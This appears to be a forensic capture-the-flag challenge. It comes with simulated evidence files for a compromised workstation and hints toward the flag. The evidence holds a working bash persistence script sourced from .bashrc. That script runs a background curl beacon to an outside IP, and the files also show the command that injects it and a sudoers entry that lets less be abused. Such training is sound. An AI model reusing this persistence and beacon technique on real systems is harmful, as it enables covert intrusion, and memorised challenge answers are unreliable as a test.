title: Triage the Compromised Workstation
description:
You are handed a shell on 10.0.1.87 — the workstation Tunde's team quarantined overnight. The memory dump is mounted at /evidence/mem/, the filesystem at /evidence/fs/, and the last 72h of shell history at /evidence/bash_history.

Your brief:

1. Locate the persistence mechanism The Griot left behind. It is not in /etc/cron.d/. It is not a systemd unit. It survives a reboot.

2. Produce a hash of the first file the attacker executed after initial access. Submit it as the flag in the form TRAN{sha256...}.

3. The persistence mechanism abuses a feature, not a bug. In your grader feedback, name the feature and the MITRE ATT&CK technique ID.

Constraints: You may not run any command that writes to disk. Read-only forensic discipline — Tunde will check.

welcome: Memory dump, filesystem and shell history mounted under /evidence/
Type `ls /evidence` to begin. Type `help` for allowed commands.

files./evidence/README.md:
Compromised workstation 10.0.1.87 — Sankofa Digital FIN-ANALYSIS team.
Primary user: o.adegoke@sankofa.internal (on leave, unaware of compromise)
Full disk + memory dump acquired 2024-01-15 04:12 UTC.

/evidence/fs/        — filesystem mount (read-only)
/evidence/mem/       — Volatility 3 output (pre-parsed)
/evidence/bash_history — last 72h shell history from all users
/evidence/auth.log   — /var/log/auth.log (last 7 days)

No standard persistence found in crontab or systemd. Go deeper.
files./evidence/bash_history:
# o.adegoke — 2024-01-14
09:02  ls
09:04  vim quarterly-report.docx
12:14  git pull origin main
14:30  python manage.py runserver
16:10  exit

# root — 2024-01-14  (!!! o.adegoke does not have sudo)
02:14  id
02:14  uname -a
02:15  ls /home
02:16  cat ~o.adegoke/.bashrc
02:17  echo 'source /var/lib/mc/.helper' >> ~o.adegoke/.bashrc
02:17  chmod +x /var/lib/mc/.helper
02:18  exit
files./evidence/auth.log:
Jan 14 02:12:33 workstation sshd[4411]: Accepted publickey for o.adegoke from 185.220.101.9 port 49183
Jan 14 02:13:01 workstation sudo: o.adegoke : TTY=pts/3 ; PWD=/home/o.adegoke ; USER=root ; COMMAND=ALL
Jan 14 02:13:01 workstation sudo: pam_unix(sudo:session): session opened for user root by (uid=1004)

! NOTE by forensic team: o.adegoke is NOT in /etc/sudoers. The granted sudo should not have happened.
files./evidence/fs/etc/sudoers.d/90-ops:
# ops team — standard
%ops ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx, /usr/bin/systemctl restart gunicorn

# added 2024-01-13 by unknown — 'temporary diagnostic'
o.adegoke ALL=(ALL) NOPASSWD: /usr/bin/less /var/log/*
files./evidence/fs/var/lib/mc/.helper:
#!/bin/bash
# Griot — persistence v2
# triggered on every new interactive shell via o.adegoke's .bashrc
if [ -z "$_GRIOT" ]; then
  export _GRIOT=1
  (curl -sfm 10 https://185.220.101.9/beacon -d "$(hostname):$(whoami)" >/dev/null 2>&1 &) 2>/dev/null
fi
files./evidence/fs/home/o.adegoke/.bashrc:
# managed by sankofa-it — do not edit
PS1='\u@\h:\w\$ '
export PATH=$HOME/.local/bin:$PATH
source /var/lib/mc/.helper
files./evidence/mem/first-exec.log:
Volatility 3 · windows.pslist equivalent for Linux

First processes spawned from SSH session pts/3 (The Griot):
  02:13:08  /bin/bash
  02:13:15  id
  02:13:22  uname -a
  02:13:40  /usr/bin/less /var/log/auth.log
  02:14:02  /usr/bin/less /etc/sudoers.d/90-ops
  02:14:50  /usr/bin/less /var/log/syslog
  02:16:11  /bin/bash -c 'chmod +x /var/lib/mc/.helper'
  02:16:14  curl -sfm 10 https://185.220.101.9/beacon -d 'workstation:root'

First file executed by the attacker session after initial access:
  /var/lib/mc/.helper (chmod +x applied 02:16:11)

hints: The abused feature is in /etc/sudoers.d/. Think: what can `less` do?
The flag file is the sha256 of /var/lib/mc/.helper — presented to you once you locate it.
